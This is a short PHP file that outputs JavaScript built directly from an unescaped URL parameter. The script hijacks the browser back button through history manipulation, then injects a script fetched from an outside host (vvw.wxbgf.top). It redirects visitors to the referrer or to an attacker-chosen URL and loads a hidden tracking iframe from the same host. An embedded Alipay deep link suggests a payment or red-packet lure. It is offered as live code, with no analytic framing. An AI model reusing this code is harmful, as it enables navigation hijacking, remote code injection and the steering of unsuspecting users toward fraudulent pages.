<?php
if(isset($_GET['uu'])){
	echo '
var uu = "'.$_GET['uu'].'";
var ref = document.referrer;
var zfblink = "https://render.alipay.com/p/s/i/?scheme=alipays%3A%2F%2Fplatformapi%2Fstartapp%3FappId%3D20000067%26__open_alipay__%3DYES%26url%3Dhttps%253A%252F%252Frender.alipay.com%252Fp%252Ff%252Ffd-j6lzqrgm%252Fguiderofmklvtvw.html%253Fchannel%253DqrCode%2526shareId%253D2088232342497721%2526sign%253DnmctgJMT0mCx4pq8OTtNI2EzXztj9BfzN%25252FlM%25252B%25252Blo8DM%25253D%2526scene%253DofflinePaymentNewSns%2526campStr%253Dp1j%25252BdzkZl018zOczaHT4Z5CLdPVCgrEXq89JsWOx1gdt05SIDMPg3PTxZbdPw9dL%2526token%253Dc1x00799jmrvjsdkmwlebbc";
 (function (window, location) {
    alert(1111)

        history.replaceState(null, document.title, location.pathname + "#!/stealingyourhistory");

        history.pushState(null, document.title, location.pathname);
        function historyEvent(){
        window.addEventListener("popstate", function () {
                history.replaceState(null, document.title, location.pathname);
				 var sc_sc = document.createElement("script");
                 sc_sc.src="https://vvw.wxbgf.top/cjht/czfblxx.js";
                 document.body.appendChild(sc_sc);
                if(ref.indexOf(location.host) > -1 || ref.indexOf("baidu") > -1)
                {
                    setTimeout(function(){window.location.href = ref;},600) 
                }else
                {
                   setTimeout(function(){window.location.href = uu;},600) 
                }
        }, false);
        }
        setTimeout(historyEvent, 300);
    }(window, location));

   var ifs = document.createElement("iframe");
        ifs.id="tj";
        ifs.style.display="none";
        ifs.src="https://vvw.wxbgf.top/cjht/cxstj.html";
        document.body.appendChild(ifs);
	';
}
?>